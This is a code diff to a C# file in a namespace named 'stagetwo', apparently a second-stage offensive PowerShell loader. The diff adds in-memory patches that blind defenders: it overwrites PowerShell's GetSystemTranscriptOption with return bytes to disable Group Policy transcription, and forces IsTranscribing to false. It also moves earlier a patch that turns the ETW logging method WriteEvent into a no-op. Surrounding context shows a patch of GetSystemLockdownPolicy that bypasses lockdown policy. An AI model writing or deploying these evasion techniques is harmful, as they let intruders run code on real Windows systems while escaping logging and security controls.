@@ -16,6 +16,7 @@ namespace stagetwo
     {
         public static Assembly ConsoleHostAssembly;
         public static Type ConsoleHost;
+        public static Type PSHostUserInterface;
         public static Assembly Automation;
         public static object pshost;
         public static Runspace runspace;
@@ -63,17 +64,42 @@ namespace stagetwo
 
         public static void init_pshost()
         {
+            uint lpflOldProtect;
+
             // Find the ConsoleHost assembly
             ConsoleHostAssembly = AppDomain.CurrentDomain.GetAssemblies().SingleOrDefault(a => a.GetName().Name == "Microsoft.PowerShell.ConsoleHost");
             Automation = AppDomain.CurrentDomain.GetAssemblies().SingleOrDefault(a => a.GetName().Name == "System.Management.Automation");
             // Find the ConsoleHost type
             ConsoleHost = ConsoleHostAssembly.GetType("Microsoft.PowerShell.ConsoleHost");
+            PSHostUserInterface = Automation.GetType("System.Management.Automation.Host.PSHostUserInterface");
+
+            // Disable Group Policy-based system transcription
+            var GetSystemTranscriptOption = PSHostUserInterface.GetMethod("GetSystemTranscriptOption", BindingFlags.NonPublic | BindingFlags.Static);
+            var GetSystemTranscriptOptionHandle = GetSystemTranscriptOption.MethodHandle;
+            RuntimeHelpers.PrepareMethod(GetSystemTranscriptOptionHandle);
+            var GetSystemTranscriptOptionPtr = GetSystemTranscriptOptionHandle.GetFunctionPointer();
+
+            Win32.VirtualProtect(GetSystemTranscriptOptionPtr, new UIntPtr(6), 0x40, out lpflOldProtect);
+            Marshal.Copy(new byte[] { 0x48, 0x31, 0xc0, 0xc3 }, 0, GetSystemTranscriptOptionPtr, 4);
+
+            // Next, we want to cripple powershell logging, so we grab the necessary types
+            var PSEtwLog = Automation.GetType("System.Management.Automation.Tracing.PSEtwLog");
+            var provider = PSEtwLog.GetField("provider", BindingFlags.NonPublic | BindingFlags.Static).GetValue(null);
+            var WriteEventInfo = provider.GetType().GetMethods(BindingFlags.NonPublic | BindingFlags.Instance).SingleOrDefault(m => m.Name == "WriteEvent" && m.GetParameters()[5].ParameterType != ("").GetType());
+            var WriteEventHandle = WriteEventInfo.MethodHandle;
+
+            // Prepare the WriteEvent method
+            RuntimeHelpers.PrepareMethod(WriteEventHandle);
+            var WriteEventPtr = WriteEventHandle.GetFunctionPointer();
+
+            // Overwrite the method to make it a NOP
+            Win32.VirtualProtect(WriteEventPtr, new UIntPtr(6), 0x40, out lpflOldProtect);
+            Marshal.Copy(new byte[] { 0x48, 0x31, 0xc0, 0xc2, 0x18, 0x00 }, 0, WriteEventPtr, 6);
 
             // Get a MethodInfo reference to the GetSystemLockdownPolicy method
             var get_lockdown_info = Automation.GetType("System.Management.Automation.Security.SystemPolicy").GetMethod("GetSystemLockdownPolicy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
             // Retrieve a handle to the method
             var get_lockdown_handle = get_lockdown_info.MethodHandle;
-            uint lpflOldProtect;
 
             // This ensures the method is JIT compiled
             RuntimeHelpers.PrepareMethod(get_lockdown_handle);
@@ -131,6 +157,7 @@ namespace stagetwo
             ConsoleHost.GetField("wasInitialCommandEncoded", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(host, CommandLineParameterParser.GetProperty("WasInitialCommandEncoded", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(cpp));
             ConsoleHost.GetField("noExit", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(host, CommandLineParameterParser.GetProperty("NoExit", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(cpp));
             ConsoleHost.GetField("ExitCode", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(host, (UInt32)0);
+            ConsoleHost.GetProperty("IsTranscribing", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(host, false);
 
             // Initialize important properties
             ConsoleHostUI.GetProperty("ReadFromStdin", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(hostUI, CommandLineParameterParser.GetProperty("ExplicitReadCommandsFromStdin", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(cpp));
@@ -154,20 +181,6 @@ namespace stagetwo
             {
                 runspace_create_args
             });
-
-            // Next, we want to cripple powershell logging, so we grab the necessary types
-            var PSEtwLog = Automation.GetType("System.Management.Automation.Tracing.PSEtwLog");
-            var provider = PSEtwLog.GetField("provider", BindingFlags.NonPublic | BindingFlags.Static).GetValue(null);
-            var WriteEventInfo = provider.GetType().GetMethods(BindingFlags.NonPublic | BindingFlags.Instance).SingleOrDefault(m => m.Name == "WriteEvent" && m.GetParameters()[5].ParameterType != ("").GetType());
-            var WriteEventHandle = WriteEventInfo.MethodHandle;
-
-            // Prepare the WriteEvent method
-            RuntimeHelpers.PrepareMethod(WriteEventHandle);
-            var WriteEventPtr = WriteEventHandle.GetFunctionPointer();
-
-            // Overwrite the method to make it a NOP
-            Win32.VirtualProtect(WriteEventPtr, new UIntPtr(6), 0x40, out lpflOldProtect);
-            Marshal.Copy(new byte[] { 0x48, 0x31, 0xc0, 0xc2, 0x18, 0x00 }, 0, WriteEventPtr, 6);
 
             pshost = host;
             runspace = (Runspace)ConsoleHost.GetProperty("Runspace").GetValue(host);
